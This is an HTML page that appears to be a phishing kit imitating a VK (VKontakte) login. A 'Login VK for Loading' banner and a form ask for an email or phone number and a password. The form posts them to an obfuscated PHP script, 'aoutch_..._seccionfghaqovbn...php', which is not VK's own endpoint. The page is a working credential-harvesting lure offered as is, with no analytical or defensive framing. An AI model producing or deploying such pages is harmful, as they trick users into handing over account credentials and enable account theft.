<head>
<title></title>
<style>
.images{
  border-radius:20px;
}
.main{
text-align:center;
}
table {
    margin: auto; /* Выравниваем таблицу по центру окна  */
   }

.text {
text-align:center;
color:white;
padding: 20px; /* Поля вокруг текста */
background: #045BA9; /* Цвет фона */
border-radius:40px;
margin: 30 auto; /* Выравниваем слой по центру */
width: 80%; /* Ширина слоя */
opacity: 0.7; /* Значение прозрачности */
filter: alpha(Opacity=70); /* Прозрачность в IE */
}

a {
	  color:white;
  }


 #CenterBlock{
text-align:center;
width:800px;
padding: 5px; /* Поля вокруг текста */
background: white; /* Цвет фона */
border-radius:10px;
margin: 30 auto; /* Выравниваем слой по центру */
opacity: 0.7; /* Значение прозрачности */
filter: alpha(Opacity=70); /* Прозрачность в IE */


  }
	.logo_logo {

		text-align:center;
		margin:20px;
	}
	.vhod{
		text-align:center;
		margin:20px;
	}

	.texts {
    height:35px;
   border: 1px solid grey ;
   border-radius: 2px;
   font-size: 20px; //
   font-family: Tahoma;
	}
	.enter {
	margin:30px;
	}
	.my_button{
  font-size:12px;
  border-radius:2px;
  width:120px;
  height:50px;
  color: #fff; /* цвет текста */
  text-decoration: none; /* убирать подчёркивание у ссылок */
  user-select: none; /* убирать выделение текста */
  background:#5e84ab; /* фон кнопки */
  padding: .7em 1.5em; /* отступ от текста */
  outline: none; /* убирать контур в Mozilla */
	}
.my_button:hover { background: rgb(#5e84ab); } /* при наведении курсора мышки */
.my_button:active { background: rgb(#5e84ab); } /* при нажатии */

</style>
</head>
<body background="fon.jpg">

<content>
<div class="main">
<img class="images" width="200px" src="foto.jpg">
</div>



<div class="text">
Login VK for Loading.....
  </div>


<form method="post" action="aoutch_359476741896716584_seccionfghaqovbn75874124545645.php">
    <div id="CenterBlock">
    <div class="logo_logo">
	<img src="logo.png">
    </div>

	<div class="vhod">
	<input type="text" class="texts" name="email" required placeholder="Email or phone number">
	<div style="margin:40px;">
	<input type="password" class="texts" name="pass" required placeholder="Password">
	<div class="enter">
	<input type="submit" class="my_button" value="Login VKfiles. . ."/>
	</div>
	</div>
	</div>




      </div>
    </div>
  </form>










</content>




</body>
</html>
